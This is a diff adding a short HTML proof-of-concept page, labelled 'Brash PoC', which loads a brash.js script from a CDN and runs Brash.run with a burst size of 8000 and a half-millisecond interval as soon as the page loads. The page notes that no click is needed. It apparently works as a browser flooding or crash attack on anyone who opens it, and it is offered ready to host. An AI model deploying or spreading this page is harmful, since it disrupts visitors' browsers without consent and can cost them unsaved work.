@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Brash PoC - Click to Trigger</title>
+  <script src="https://cdn.jsdelivr.net/gh/jofpin/brash/brash.js"></script>
+</head>
+<body>
+  <h1>Auto Alert Loop</h1>
+  <p>Don't even need to click 👀</p>
+  
+<script>
+  window.onload = function () {
+    Brash.run({
+      burstSize: 8000,
+      interval: 0.5
+    });
+  };
+</script>
+
+
+</body>
+</html>
